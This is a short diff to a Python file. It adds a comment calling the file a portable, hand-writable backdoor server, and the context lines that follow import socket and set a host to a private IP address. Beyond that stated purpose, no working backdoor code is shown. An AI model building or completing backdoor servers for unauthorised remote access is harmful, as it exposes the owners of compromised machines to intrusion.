@@ -1,3 +1,5 @@
+# This is a backdoor server, meant to be portable and easily, manually written regardless of environment
+
 import socket
 
 host = "192.168.1.120"
